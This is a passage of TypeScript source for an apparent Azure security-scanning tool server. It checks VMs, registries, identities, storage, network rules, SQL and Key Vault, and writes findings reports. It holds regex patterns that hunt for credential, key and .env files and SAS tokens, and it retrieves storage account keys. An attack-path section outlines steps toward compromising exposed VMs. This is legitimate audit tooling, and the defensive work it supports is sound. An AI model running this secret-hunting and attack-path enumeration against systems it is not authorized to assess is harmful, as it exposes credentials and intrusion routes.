              text: formatResponse(`# Cosmos DB Security Analysis\n\n## Summary\n- Total Cosmos DB Accounts: ${cosmosAccounts.length}\n- HIGH Risk: ${cosmosAccounts.filter(c => c.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${cosmosAccounts.filter(c => c.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(cosmosAccounts, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_analyze_vm_security": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const computeClient = new ComputeManagementClient(credential, subscriptionId);
        const vms: any[] = [];

        const virtualMachines = resourceGroup
          ? computeClient.virtualMachines.list(resourceGroup)
          : computeClient.virtualMachines.listAll();

        for await (const vm of virtualMachines) {
          const vmFindings: any[] = [];
          let riskScore = 0;
          const vmRg = vm.id?.split('/')[4] || resourceGroup || "";

          const osDiskEncrypted = vm.storageProfile?.osDisk?.encryptionSettings?.enabled || 
                                  vm.storageProfile?.osDisk?.managedDisk?.securityProfile?.securityEncryptionType;
          if (!osDiskEncrypted) {
            vmFindings.push({
              severity: "CRITICAL",
              finding: "OS disk encryption NOT enabled",
              description: "Operating system disk is not encrypted at rest",
              remediation: "Enable Azure Disk Encryption (BitLocker/dm-crypt)",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 50;
          }

          let unencryptedDataDisks = 0;
          if (vm.storageProfile?.dataDisks) {
            for (const disk of vm.storageProfile.dataDisks) {
              if (!disk.managedDisk?.securityProfile?.securityEncryptionType) {
                unencryptedDataDisks++;
              }
            }
          }
          if (unencryptedDataDisks > 0) {
            vmFindings.push({
              severity: "HIGH",
              finding: `${unencryptedDataDisks} data disk(s) not encrypted`,
              description: "Data disks are not encrypted at rest",
              remediation: "Enable Azure Disk Encryption on all data disks",
              cve: "CWE-311: Missing Encryption of Sensitive Data",
            });
            riskScore += 30;
          }

          const hasDefender = vm.resources?.some(ext => 
            ext.name?.includes("MDE") || ext.name?.includes("Defender"));
          const hasMonitoring = vm.resources?.some(ext => 
            ext.name?.includes("AzureMonitor") || ext.name?.includes("OMS"));

          if (!hasDefender) {
            vmFindings.push({
              severity: "MEDIUM",
              finding: "Microsoft Defender extension not installed",
              description: "VM lacks endpoint protection",
              remediation: "Install Microsoft Defender for Endpoint extension",
              cve: "CWE-693: Protection Mechanism Failure",
            });
            riskScore += 15;
          }

          vms.push({
            name: vm.name,
            resourceGroup: vmRg,
            location: vm.location,
            osType: vm.storageProfile?.osDisk?.osType,
            osDiskEncrypted: !!osDiskEncrypted,
            unencryptedDataDisks,
            hasDefender,
            hasMonitoring,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: vmFindings,
          });
        }

        vms.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Virtual Machine Security Analysis\n\n## Summary\n- Total VMs: ${vms.length}\n- CRITICAL Risk: ${vms.filter(v => v.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${vms.filter(v => v.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${vms.filter(v => v.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(vms, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_scan_acr_security": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const acrClient = new ContainerRegistryManagementClient(credential, subscriptionId);
        const registries: any[] = [];

        const acrs = resourceGroup
          ? acrClient.registries.listByResourceGroup(resourceGroup)
          : acrClient.registries.list();

        for await (const acr of acrs) {
          const acrFindings: any[] = [];
          let riskScore = 0;

          if (acr.adminUserEnabled) {
            acrFindings.push({
              severity: "CRITICAL",
              finding: "Admin user is ENABLED",
              description: "Registry uses admin credentials instead of service principals",
              remediation: "Disable admin user and use Azure AD service principals",
              cve: "CWE-798: Use of Hard-coded Credentials",
            });
            riskScore += 50;
          }

          if (acr.publicNetworkAccess === "Enabled") {
            acrFindings.push({
              severity: "HIGH",
              finding: "Public network access is ENABLED",
              description: "Registry is accessible from public Internet",
              remediation: "Use private endpoints and disable public access",
              cve: "CWE-668: Exposure of Resource to Wrong Sphere",
            });
            riskScore += 30;
          }

          if (!acr.networkRuleSet || acr.networkRuleSet.defaultAction === "Allow") {
            acrFindings.push({
              severity: "MEDIUM",
              finding: "No network restrictions configured",
              description: "Registry accessible from all networks",
              remediation: "Configure network rules to restrict access",
              cve: "CWE-923: Improper Restriction of Communication Channel",
            });
            riskScore += 15;
          }

          registries.push({
            name: acr.name,
            resourceGroup: acr.id?.split('/')[4],
            location: acr.location,
            sku: acr.sku?.name,
            adminUserEnabled: acr.adminUserEnabled,
            publicNetworkAccess: acr.publicNetworkAccess,
            networkRuleSetDefault: acr.networkRuleSet?.defaultAction,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            findings: acrFindings,
          });
        }

        registries.sort((a, b) => b.riskScore - a.riskScore);

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Container Registry Security Analysis\n\n## Summary\n- Total ACRs: ${registries.length}\n- CRITICAL Risk: ${registries.filter(r => r.riskLevel === "CRITICAL").length}\n- HIGH Risk: ${registries.filter(r => r.riskLevel === "HIGH").length}\n- MEDIUM Risk: ${registries.filter(r => r.riskLevel === "MEDIUM").length}\n\n## Detailed Findings\n\n${JSON.stringify(registries, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_enumerate_service_principals": {
        const { subscriptionId, format } = request.params.arguments as {
          subscriptionId: string;
          format?: string;
        };

        // Note: Service principals are tenant-level, requires Microsoft Graph API
        // This is a placeholder that shows the concept
        const message = `# Service Principal Enumeration\n\n[WARN] This tool requires Microsoft Graph API permissions.\n\nTo enumerate service principals, you need:\n1. Microsoft.Graph PowerShell module or Graph API access\n2. Application.Read.All or Directory.Read.All permissions\n\nExample PowerShell commands:\n\`\`\`powershell\nConnect-MgGraph -Scopes "Application.Read.All"\nGet-MgServicePrincipal -All\n\`\`\`\n\nThis feature will be enhanced in future versions with proper Graph API integration.`;

        return {
          content: [
            {
              type: "text",
              text: formatResponse(message, format, request.params.name),
            },
          ],
        };
      }

      case "azure_enumerate_managed_identities": {
        const { subscriptionId, resourceGroup, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
        };

        const resourceClient = new ResourceManagementClient(credential, subscriptionId);
        const identities: any[] = [];

        // Find user-assigned managed identities
        const filter = "resourceType eq 'Microsoft.ManagedIdentity/userAssignedIdentities'";
        const resources = resourceGroup
          ? resourceClient.resources.listByResourceGroup(resourceGroup, { filter })
          : resourceClient.resources.list({ filter });

        for await (const identity of resources) {
          identities.push({
            name: identity.name,
            type: "User-Assigned",
            resourceGroup: identity.id?.split('/')[4],
            location: identity.location,
            id: identity.id,
          });
        }

        // Find resources with system-assigned identities
        const allResources = resourceGroup
          ? resourceClient.resources.listByResourceGroup(resourceGroup)
          : resourceClient.resources.list();

        const resourcesWithIdentity: any[] = [];
        for await (const resource of allResources) {
          if (resource.identity) {
            resourcesWithIdentity.push({
              resourceName: resource.name,
              resourceType: resource.type,
              identityType: resource.identity.type,
              principalId: resource.identity.principalId,
              resourceGroup: resource.id?.split('/')[4],
            });
          }
        }

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Managed Identity Enumeration\n\n## Summary\n- User-Assigned Identities: ${identities.length}\n- Resources with System-Assigned Identity: ${resourcesWithIdentity.length}\n\n## User-Assigned Identities\n\n${JSON.stringify(identities, null, 2)}\n\n## Resources with System-Assigned Identity\n\n${JSON.stringify(resourcesWithIdentity, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_scan_storage_containers": {
        const { subscriptionId, resourceGroup, storageAccountName, maxBlobsPerContainer, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          storageAccountName?: string;
          maxBlobsPerContainer?: number;
          format?: string;
        };

        const maxBlobs = maxBlobsPerContainer || 100;
        const storageClient = new StorageManagementClient(credential, subscriptionId);
        const scanResults: any[] = [];

        // Sensitive file patterns
        const sensitivePatterns = [
          { pattern: /\.(bak|backup)$/i, category: "Backup", severity: "CRITICAL" },
          { pattern: /\.(sql|db|mdf|ldf)$/i, category: "Database", severity: "CRITICAL" },
          { pattern: /\.(key|pem|pfx|p12|cer|ppk)$/i, category: "Certificate/Key", severity: "CRITICAL" },
          { pattern: /(web\.config|appsettings\.json|app\.config|\.env)$/i, category: "Configuration", severity: "CRITICAL" },
          { pattern: /(credentials|passwords|secrets)\.?/i, category: "Credentials", severity: "CRITICAL" },
          { pattern: /\.(kdbx|keystore|jks)$/i, category: "Keystore", severity: "HIGH" },
          { pattern: /(id_rsa|id_dsa|authorized_keys)$/i, category: "SSH Key", severity: "HIGH" },
          { pattern: /\.(zip|tar|gz|7z|rar)$/i, category: "Archive", severity: "MEDIUM" },
        ];

        let accountsToScan: any[] = [];
        if (storageAccountName) {
          // Scan specific storage account
          const account = await storageClient.storageAccounts.getProperties(resourceGroup || "", storageAccountName);
          accountsToScan.push(account);
        } else {
          // Scan all storage accounts with public blob access
          const accounts = resourceGroup
            ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
            : storageClient.storageAccounts.list();

          for await (const account of accounts) {
            // Only scan accounts with potential public access
            if (account.allowBlobPublicAccess !== false) {
              accountsToScan.push(account);
            }
          }
        }

        // Scan each storage account
        for (const account of accountsToScan) {
          const accountName = account.name || "";
          const accountRg = account.id?.split('/')[4] || resourceGroup || "";
          let riskScore = 0;
          const accountFindings: any[] = [];
          const containers: any[] = [];
          let totalSensitiveFiles = 0;

          try {
            const keys = await storageClient.storageAccounts.listKeys(accountRg, accountName);
            const accountKey = keys.keys?.[0]?.value;

            if (!accountKey) {
              accountFindings.push({
                severity: "INFO",
                finding: "Cannot list keys - using managed identity authentication",
              });
              continue;
            }

            // Create BlobServiceClient
            const blobServiceClient = new BlobServiceClient(
              `https://${accountName}.blob.core.windows.net`,
              credential
            );

            // List all containers
            const containerIterator = blobServiceClient.listContainers();
            
            for await (const containerItem of containerIterator) {
              const containerName = containerItem.name;
              const containerClient = blobServiceClient.getContainerClient(containerName);
              const containerFindings: any[] = [];
              const sensitiveBlobs: any[] = [];
              let blobCount = 0;

              const accessLevel = containerItem.properties?.publicAccess || "None";
              if (accessLevel !== "None") {
                containerFindings.push({
                  severity: "CRITICAL",
                  finding: `Container has public access: ${accessLevel}`,
                  description: "Blobs in this container can be accessed anonymously",
                  remediation: "Set public access level to 'None' (Private)",
                  cve: "CWE-284: Improper Access Control",
                  url: `https://${accountName}.blob.core.windows.net/${containerName}`,
                });
                riskScore += 50;
              }

              // List blobs in container
              try {
                const blobIterator = containerClient.listBlobsFlat({ includeMetadata: true });
                
                for await (const blob of blobIterator) {
                  blobCount++;
                  if (blobCount > maxBlobs) {
                    containerFindings.push({
                      severity: "INFO",
                      finding: `Stopped after ${maxBlobs} blobs (maxBlobsPerContainer limit)`,
                    });
                    break;
                  }

                  const blobName = blob.name;
                  const blobUrl = `https://${accountName}.blob.core.windows.net/${containerName}/${blobName}`;

                  for (const { pattern, category, severity } of sensitivePatterns) {
                    if (pattern.test(blobName)) {
                      sensitiveBlobs.push({
                        name: blobName,
                        category,
                        severity,
                        size: blob.properties.contentLength,
                        lastModified: blob.properties.lastModified,
                        url: blobUrl,
                        publicAccess: accessLevel !== "None",
                      });
                      totalSensitiveFiles++;

                      if (accessLevel !== "None") {
                        containerFindings.push({
                          severity,
                          finding: `${severity} sensitive file exposed: ${blobName}`,
                          description: `${category} file is publicly accessible`,
                          remediation: "Move to private container or Key Vault",
                          cve: "CWE-200: Exposure of Sensitive Information",
                          url: blobUrl,
                        });
                        riskScore += severity === "CRITICAL" ? 40 : severity === "HIGH" ? 25 : 10;
                      }
                      break;
                    }
                  }

                  if (blob.metadata) {
                    const metadataStr = JSON.stringify(blob.metadata).toLowerCase();
                    if (metadataStr.includes('sig=') || metadataStr.includes('sastoken')) {
                      containerFindings.push({
                        severity: "HIGH",
                        finding: `SAS token detected in blob metadata: ${blobName}`,
                        description: "Blob metadata contains potential SAS token",
                        remediation: "Remove SAS tokens from blob metadata",
                        cve: "CWE-798: Use of Hard-coded Credentials",
                      });
                      riskScore += 30;
                    }
                  }
                }
              } catch (blobError: any) {
                containerFindings.push({
                  severity: "WARNING",
                  finding: `Could not list blobs: ${blobError.message}`,
                });
              }

              containers.push({
                name: containerName,
                publicAccessLevel: accessLevel,
                blobCount,
                sensitiveFilesFound: sensitiveBlobs.length,
                sensitiveBlobs,
                findings: containerFindings,
              });
            }

            accountFindings.push(...containers.flatMap(c => c.findings));

          } catch (error: any) {
            accountFindings.push({
              severity: "ERROR",
              finding: `Failed to scan storage account: ${error.message}`,
              description: "Ensure you have Storage Blob Data Reader role or account key access",
            });
          }

          scanResults.push({
            storageAccountName: accountName,
            resourceGroup: accountRg,
            location: account.location,
            allowBlobPublicAccess: account.allowBlobPublicAccess,
            totalContainers: containers.length,
            publicContainers: containers.filter(c => c.publicAccessLevel !== "None").length,
            totalSensitiveFiles,
            riskScore,
            riskLevel: riskScore >= 50 ? "CRITICAL" : riskScore >= 30 ? "HIGH" : riskScore >= 15 ? "MEDIUM" : "LOW",
            containers,
            findings: accountFindings,
          });
        }

        // Sort by risk score
        scanResults.sort((a, b) => b.riskScore - a.riskScore);

        const summary = {
          totalAccountsScanned: scanResults.length,
          criticalRisk: scanResults.filter(s => s.riskLevel === "CRITICAL").length,
          highRisk: scanResults.filter(s => s.riskLevel === "HIGH").length,
          totalSensitiveFiles: scanResults.reduce((sum, s) => sum + s.totalSensitiveFiles, 0),
          publicContainers: scanResults.reduce((sum, s) => sum + s.publicContainers, 0),
        };

        return {
          content: [
            {
              type: "text",
              text: formatResponse(`# Storage Container & Blob Deep Scan\n\n## Summary\n- Storage Accounts Scanned: ${summary.totalAccountsScanned}\n- CRITICAL Risk: ${summary.criticalRisk}\n- HIGH Risk: ${summary.highRisk}\n- Total Sensitive Files Found: ${summary.totalSensitiveFiles}\n- Public Containers: ${summary.publicContainers}\n\n## Detailed Findings\n\n${JSON.stringify(scanResults, null, 2)}`, format, request.params.name),
            },
          ],
        };
      }

      case "azure_generate_security_report": {
        const { subscriptionId, resourceGroup, format, includeRemediation, includeCompliance } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          format?: string;
          includeRemediation?: boolean;
          includeCompliance?: boolean;
        };

        const outputFormat = format || "markdown";
        const withRemediation = includeRemediation !== false;
        const withCompliance = includeCompliance !== false;

        // Run all security scanners to gather findings
        const findings: any = {
          subscription: subscriptionId,
          resourceGroup: resourceGroup || "All",
          scanDate: new Date().toISOString(),
          summary: {
            critical: 0,
            high: 0,
            medium: 0,
            low: 0,
            totalFindings: 0,
          },
          categories: {} as any,
        };

        try {
          // Storage security scan
          const storageClient = new StorageManagementClient(credential, subscriptionId);
          const storageAccounts = resourceGroup
            ? storageClient.storageAccounts.listByResourceGroup(resourceGroup)
            : storageClient.storageAccounts.list();

          const storageFindings: any[] = [];
          for await (const account of storageAccounts) {
            const accountFindings: any[] = [];
            if (account.allowBlobPublicAccess === true) {
              accountFindings.push({ severity: "HIGH", resource: account.name, finding: "Public blob access enabled" });
            }
            if (account.enableHttpsTrafficOnly === false) {
              accountFindings.push({ severity: "CRITICAL", resource: account.name, finding: "HTTPS-only disabled" });
            }
            if (account.minimumTlsVersion !== "TLS1_2") {
              accountFindings.push({ severity: "HIGH", resource: account.name, finding: "Weak TLS version" });
            }
            storageFindings.push(...accountFindings);
          }
          findings.categories.storage = { count: storageFindings.length, findings: storageFindings };

          // NSG security scan
          const networkClient = new NetworkManagementClient(credential, subscriptionId);
          const nsgs = resourceGroup
            ? networkClient.networkSecurityGroups.list(resourceGroup)
            : networkClient.networkSecurityGroups.listAll();

          const nsgFindings: any[] = [];
          const dangerousPorts = [22, 3389, 1433, 3306, 5432, 27017, 5985, 5986];
          for await (const nsg of nsgs) {
            for (const rule of nsg.securityRules || []) {
              if (rule.access === "Allow" && rule.direction === "Inbound") {
                const sourceWildcard = ["*", "0.0.0.0/0", "Internet", "Any"].some(s =>
                  rule.sourceAddressPrefix?.includes(s) || rule.sourceAddressPrefixes?.some(p => p.includes(s))
                );
                const port = rule.destinationPortRange;
                if (sourceWildcard && port && dangerousPorts.some(p => port.includes(String(p)))) {
                  nsgFindings.push({ severity: "CRITICAL", resource: nsg.name, finding: `Port ${port} exposed to Internet` });
                }
              }
            }
          }
          findings.categories.network = { count: nsgFindings.length, findings: nsgFindings };

          // SQL security scan
          const sqlClient = new SqlManagementClient(credential, subscriptionId);
          const sqlServers = sqlClient.servers.list();
          const sqlFindings: any[] = [];
          for await (const server of sqlServers) {
            const serverRg = server.id?.split('/')[4] || "";
            const firewallRules = await sqlClient.firewallRules.listByServer(serverRg, server.name || "");
            for await (const rule of firewallRules) {
              if (rule.startIpAddress === "0.0.0.0" && rule.endIpAddress === "255.255.255.255") {
                sqlFindings.push({ severity: "CRITICAL", resource: server.name, finding: "SQL firewall allows all IPs" });
              }
            }
          }
          findings.categories.sql = { count: sqlFindings.length, findings: sqlFindings };

          // Key Vault security scan
          const kvClient = new KeyVaultManagementClient(credential, subscriptionId);
          const vaults = resourceGroup
            ? kvClient.vaults.listByResourceGroup(resourceGroup)
            : kvClient.vaults.listBySubscription();
          const kvFindings: any[] = [];
          for await (const vault of vaults) {
            if (!vault.properties?.enableSoftDelete) {
              kvFindings.push({ severity: "CRITICAL", resource: vault.name, finding: "Soft delete disabled" });
            }
            if (!vault.properties?.enablePurgeProtection) {
              kvFindings.push({ severity: "HIGH", resource: vault.name, finding: "Purge protection disabled" });
            }
          }
          findings.categories.keyvault = { count: kvFindings.length, findings: kvFindings };

        } catch (error: any) {
          findings.error = `Failed to gather all findings: ${error.message}`;
        }

        // Calculate summary
        for (const category of Object.values(findings.categories)) {
          const cat = category as any;
          for (const finding of cat.findings || []) {
            findings.summary.totalFindings++;
            if (finding.severity === "CRITICAL") findings.summary.critical++;
            else if (finding.severity === "HIGH") findings.summary.high++;
            else if (finding.severity === "MEDIUM") findings.summary.medium++;
            else findings.summary.low++;
          }
        }

        // Generate report based on format
        if (outputFormat === "json") {
          return {
            content: [{ type: "text", text: JSON.stringify(findings, null, 2) }],
          };
        }

        // Markdown format
        let report = `# Azure Security Assessment Report\n\n`;
        report += `**Subscription:** ${subscriptionId}\n`;
        report += `**Resource Group:** ${findings.resourceGroup}\n`;
        report += `**Scan Date:** ${findings.scanDate}\n\n`;
        report += `## Executive Summary\n\n`;
        report += `**Total Findings:** ${findings.summary.totalFindings}\n`;
        report += `- [CRITICAL] **CRITICAL:** ${findings.summary.critical}\n`;
        report += `- [HIGH] **HIGH:** ${findings.summary.high}\n`;
        report += `- [MEDIUM] **MEDIUM:** ${findings.summary.medium}\n`;
        report += `- [LOW] **LOW:** ${findings.summary.low}\n\n`;

        report += `## Risk Assessment\n\n`;
        const overallRisk = findings.summary.critical > 0 ? "CRITICAL" : findings.summary.high > 0 ? "HIGH" : "MEDIUM";
        report += `**Overall Risk Level:** ${overallRisk}\n\n`;

        report += `## Findings by Category\n\n`;
        for (const [category, data] of Object.entries(findings.categories)) {
          const cat = data as any;
          report += `### ${category.toUpperCase()} (${cat.count} findings)\n\n`;
          for (const finding of cat.findings || []) {
            report += `- **${finding.severity}**: ${finding.resource} - ${finding.finding}\n`;
          }
          report += `\n`;
        }

        if (withRemediation) {
          report += `## Remediation Priorities\n\n`;
          report += `### Immediate Actions (CRITICAL)\n`;
          report += `1. Disable HTTP-only on storage accounts (enable HTTPS)\n`;
          report += `2. Remove SQL firewall allow-all rules (0.0.0.0-255.255.255.255)\n`;
          report += `3. Enable Key Vault soft delete\n`;
          report += `4. Close management ports exposed to Internet (SSH/RDP)\n\n`;

          report += `### Short-term (HIGH - within 7 days)\n`;
          report += `1. Disable public blob access on storage accounts\n`;
          report += `2. Upgrade TLS to version 1.2+\n`;
          report += `3. Enable Key Vault purge protection\n`;
          report += `4. Restrict NSG rules to specific IPs\n\n`;
        }

        if (withCompliance) {
          report += `## Compliance Framework Mapping\n\n`;
          report += `### CIS Azure Foundations Benchmark\n`;
          report += `- **3.1** [CHECK] Ensure secure transfer (HTTPS) is enabled - ${findings.categories.storage?.findings.filter((f: any) => f.finding.includes("HTTPS")).length || 0} violations\n`;
          report += `- **3.2** [CHECK] Ensure storage account access keys are periodically regenerated\n`;
          report += `- **3.3** [CHECK] Ensure public network access is disabled for storage accounts - ${findings.categories.storage?.findings.filter((f: any) => f.finding.includes("Public")).length || 0} violations\n`;
          report += `- **6.1** [CHECK] Ensure SQL server firewall rules do not allow 0.0.0.0-255.255.255.255 - ${findings.categories.sql?.findings.filter((f: any) => f.finding.includes("firewall")).length || 0} violations\n\n`;

          report += `### NIST Cybersecurity Framework\n`;
          report += `- **PR.AC-3**: Implement remote access management\n`;
          report += `- **PR.DS-1**: Data-at-rest is protected (encryption)\n`;
          report += `- **PR.DS-2**: Data-in-transit is protected (HTTPS/TLS)\n`;
          report += `- **PR.PT-4**: Communications and control networks are protected\n\n`;
        }

        report += `---\n\n`;
        report += `*Generated by Stratos v1.8.0*\n`;
        report += `*HackTricks Methodology: https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/*\n`;

        // Handle different export formats
        const { outputFile } = request.params.arguments as { outputFile?: string };

        // CSV Export
        if (outputFormat === "csv") {
          const csvData: any[] = [];
          for (const [category, data] of Object.entries(findings.categories)) {
            const cat = data as any;
            for (const finding of cat.findings || []) {
              csvData.push({
                Category: category.toUpperCase(),
                Severity: finding.severity,
                Resource: finding.resource,
                Finding: finding.finding,
                Subscription: subscriptionId,
                ScanDate: findings.scanDate,
              });
            }
          }

          if (outputFile) {
            try {
              const csvWriter = createObjectCsvWriter({
                path: outputFile,
                header: [
                  { id: 'Severity', title: 'Severity' },
                  { id: 'Category', title: 'Category' },
                  { id: 'Resource', title: 'Resource' },
                  { id: 'Finding', title: 'Finding' },
                  { id: 'Subscription', title: 'Subscription' },
                  { id: 'ScanDate', title: 'Scan Date' },
                ],
              });
              await csvWriter.writeRecords(csvData);
              return {
                content: [{ type: "text", text: `[OK] CSV report saved to: ${outputFile}\n\nTotal findings exported: ${csvData.length}` }],
              };
            } catch (error: any) {
              return {
                content: [{ type: "text", text: `[FAIL] Failed to save CSV: ${error.message}\n\nCSV Data:\n${JSON.stringify(csvData, null, 2)}` }],
              };
            }
          } else {
            // Return CSV as text
            const csvText = 'Severity,Category,Resource,Finding,Subscription,ScanDate\n' +
              csvData.map(row => `${row.Severity},${row.Category},"${row.Resource}","${row.Finding}",${row.Subscription},${row.ScanDate}`).join('\n');
            return {
              content: [{ type: "text", text: csvText }],
            };
          }
        }

        // HTML Export
        if (outputFormat === "html") {
          const htmlReport = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Azure Security Assessment Report</title>
  <style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 40px; background: #f5f5f5; }
    .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    h1 { color: #0078d4; border-bottom: 3px solid #0078d4; padding-bottom: 10px; }
    h2 { color: #333; margin-top: 30px; }
    .summary { background: #e7f3ff; padding: 20px; border-radius: 5px; margin: 20px 0; }
    .critical { color: #d13438; font-weight: bold; }
    .high { color: #ff8c00; font-weight: bold; }
    .medium { color: #f4c430; font-weight: bold; }
    .low { color: #107c10; font-weight: bold; }
    table { width: 100%; border-collapse: collapse; margin: 20px 0; }
    th { background: #0078d4; color: white; padding: 12px; text-align: left; }
    td { padding: 10px; border-bottom: 1px solid #ddd; }
    tr:hover { background: #f9f9f9; }
    .metadata { color: #666; font-size: 0.9em; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Azure Security Assessment Report</h1>
    <div class="metadata">
      <p><strong>Subscription:</strong> ${subscriptionId}</p>
      <p><strong>Resource Group:</strong> ${findings.resourceGroup}</p>
      <p><strong>Scan Date:</strong> ${findings.scanDate}</p>
    </div>
    
    <div class="summary">
      <h2>Executive Summary</h2>
      <p><strong>Total Findings:</strong> ${findings.summary.totalFindings}</p>
      <p class="critical">[CRITICAL] CRITICAL: ${findings.summary.critical}</p>
      <p class="high">[HIGH] HIGH: ${findings.summary.high}</p>
      <p class="medium">[MEDIUM] MEDIUM: ${findings.summary.medium}</p>
      <p class="low">[LOW] LOW: ${findings.summary.low}</p>
    </div>

    <h2>Findings by Category</h2>
    ${Object.entries(findings.categories).map(([category, data]) => {
      const cat = data as any;
      return `
        <h3>${category.toUpperCase()} (${cat.count} findings)</h3>
        <table>
          <tr><th>Severity</th><th>Resource</th><th>Finding</th></tr>
          ${cat.findings.map((f: any) => `
            <tr>
              <td class="${f.severity.toLowerCase()}">${f.severity}</td>
              <td>${f.resource}</td>
              <td>${f.finding}</td>
            </tr>
          `).join('')}
        </table>
      `;
    }).join('')}

    <hr>
    <p class="metadata">Generated by Stratos v1.8.0</p>
  </div>
</body>
</html>`;

          if (outputFile) {
            try {
              fs.writeFileSync(outputFile, htmlReport, 'utf-8');
              return {
                content: [{ type: "text", text: `[OK] HTML report saved to: ${outputFile}\n\nOpen in browser to view the interactive dashboard.` }],
              };
            } catch (error: any) {
              return {
                content: [{ type: "text", text: `[FAIL] Failed to save HTML: ${error.message}` }],
              };
            }
          } else {
            return {
              content: [{ type: "text", text: htmlReport }],
            };
          }
        }

        // PDF Export
        if (outputFormat === "pdf") {
          if (!outputFile) {
            return {
              content: [{ type: "text", text: `[FAIL] PDF export requires outputFile parameter.\n\nExample: outputFile="C:\\\\reports\\\\security-report.pdf"` }],
              isError: true,
            };
          }

          try {
            const doc = new PDFDocument({ margin: 50 });
            const stream = fs.createWriteStream(outputFile);
            doc.pipe(stream);

            // Title
            doc.fontSize(24).fillColor('#0078d4').text('Azure Security Assessment Report', { align: 'center' });
            doc.moveDown();

            // Metadata
            doc.fontSize(10).fillColor('#666')
              .text(`Subscription: ${subscriptionId}`, { continued: true })
              .text(`  |  Resource Group: ${findings.resourceGroup}`, { continued: true })
              .text(`  |  Date: ${new Date(findings.scanDate).toLocaleDateString()}`);
            doc.moveDown(2);

            // Executive Summary
            doc.fontSize(16).fillColor('#000').text('Executive Summary');
            doc.moveDown(0.5);
            doc.fontSize(12)
              .text(`Total Findings: ${findings.summary.totalFindings}`)
              .fillColor('#d13438').text(`[CRITICAL] CRITICAL: ${findings.summary.critical}`)
              .fillColor('#ff8c00').text(`[HIGH] HIGH: ${findings.summary.high}`)
              .fillColor('#f4c430').text(`[MEDIUM] MEDIUM: ${findings.summary.medium}`)
              .fillColor('#107c10').text(`[LOW] LOW: ${findings.summary.low}`);
            doc.moveDown(2);

            // Findings
            doc.fontSize(16).fillColor('#000').text('Findings by Category');
            doc.moveDown();

            for (const [category, data] of Object.entries(findings.categories)) {
              const cat = data as any;
              doc.fontSize(14).text(`${category.toUpperCase()} (${cat.count} findings)`);
              doc.moveDown(0.5);

              for (const finding of cat.findings || []) {
                const color = finding.severity === 'CRITICAL' ? '#d13438' :
                              finding.severity === 'HIGH' ? '#ff8c00' :
                              finding.severity === 'MEDIUM' ? '#f4c430' : '#107c10';
                doc.fontSize(10)
                  .fillColor(color).text(`[${finding.severity}] `, { continued: true })
                  .fillColor('#000').text(`${finding.resource}: ${finding.finding}`);
              }
              doc.moveDown();
            }

            doc.fontSize(8).fillColor('#666')
              .text('Generated by Stratos v1.8.0', { align: 'center' });

            doc.end();

            await new Promise<void>((resolve) => stream.on('finish', () => resolve()));

            return {
              content: [{ type: "text", text: `[OK] PDF report saved to: ${outputFile}\n\nTotal findings: ${findings.summary.totalFindings}\n[CRITICAL] Critical: ${findings.summary.critical}\n[HIGH] High: ${findings.summary.high}` }],
            };
          } catch (error: any) {
            return {
              content: [{ type: "text", text: `[FAIL] Failed to generate PDF: ${error.message}` }],
              isError: true,
            };
          }
        }

        // Default: Markdown or JSON
        return {
          content: [{ type: "text", text: report }],
        };
      }

      case "azure_analyze_attack_paths": {
        const { subscriptionId, resourceGroup, startFrom, format } = request.params.arguments as {
          subscriptionId: string;
          resourceGroup?: string;
          startFrom?: string;
          format?: string;
        };

        const startPoint = startFrom || "all";
        const attackPaths: any[] = [];

        try {
          const networkClient = new NetworkManagementClient(credential, subscriptionId);
          const storageClient = new StorageManagementClient(credential, subscriptionId);
          const computeClient = new ComputeManagementClient(credential, subscriptionId);
          const authClient = new AuthorizationManagementClient(credential, subscriptionId);
          const resourceClient = new ResourceManagementClient(credential, subscriptionId);

          // Attack Path 1: Public IP → NSG → VM → Managed Identity → Resources
          if (startPoint === "all" || startPoint === "public-ips") {
            const publicIPs = resourceGroup
              ? networkClient.publicIPAddresses.list(resourceGroup)
              : networkClient.publicIPAddresses.listAll();

            for await (const pip of publicIPs) {
              const attachedTo = pip.ipConfiguration?.id?.split('/').slice(-3, -2)[0];
              if (attachedTo === "networkInterfaces") {
                const nicId = pip.ipConfiguration?.id;
                const vmName = nicId?.split('/').slice(-3)[0];

                attackPaths.push({
                  severity: "HIGH",
                  path: "Public IP → VM → Managed Identity",
                  steps: [
                    `1. Target public IP: ${pip.ipAddress} (${pip.dnsSettings?.fqdn || "no DNS"})`,
                    `2. Attached to VM: ${vmName}`,
                    `3. Check NSG rules for exposed ports (SSH/RDP)`,
                    `4. Compromise VM via exposed service`,
